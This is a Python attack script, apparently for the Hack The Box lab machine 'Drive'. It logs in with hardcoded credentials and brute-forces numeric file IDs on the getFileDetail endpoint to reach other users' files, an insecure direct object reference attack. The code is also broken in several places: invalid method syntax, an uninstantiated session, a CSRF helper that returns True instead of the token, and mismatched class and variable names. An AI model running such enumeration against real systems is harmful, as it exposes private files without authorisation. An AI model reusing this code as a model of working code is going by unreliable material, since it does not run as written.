````python
#!/usr/bin/env python3

import requests
import pdb
import sys
import re
import signal

from pwn import *
from termcolor import colored

class HTBDriveBruteForce:

    def __init__(self, base_url):
        self.base_url = base_url
        self.login_url = f"{self.base_url}/login/"
        self.session = requests.session
        self.p1 = log.progress("Fuerza bruta")
        signal.signal(signal.SIGINT, self.def_handler)



    def self.def_handler(sig, frame):
        print(colored(f"\n\n[!] Saliendo...\n", 'red'))
        sys.exit(1)


    def getCsrfToken(self):

        r = self.session.get(self.login_url)
        token = re.findall(r'name="csrfmiddlewaretoken" value=(.*?)"', r.text)[0]

        return True

    def login(self, username, password):

        post_data = {
                'csrfmiddlewaretoken': self.getCsrfToken(),
                'username': username,
                'password': password
        }

        r = self.session.post(self.login_url, data=post_data)

    def bruteForceIds(self):

        self.p1.status("Iniciando ataque de fuerza bruta")

        time.sleep(2)

        for id  in range(0, 500):
             self.p1.status(f"identificadores probados [{id}/500]")
             file_url = f"{self.base_url}/{id}/getFileDetail/"

             r = self.session.get(file_url)

             if r.status_code != 500:
                 print(colored(f"\n[+] ID [{id}]: {r.status_code}" 'yellow'))

        self.p1.success("ataque  de fuerza bruta finalizado exitosamente")

if __name__ == '__main__':

    brute_forcer = HTBDriverForcer("http://drive.htb")
    brute_forcer.login('ajente007', 'setensofuerte$!')
    brute.forcer.bruteForceIds()
    ````
    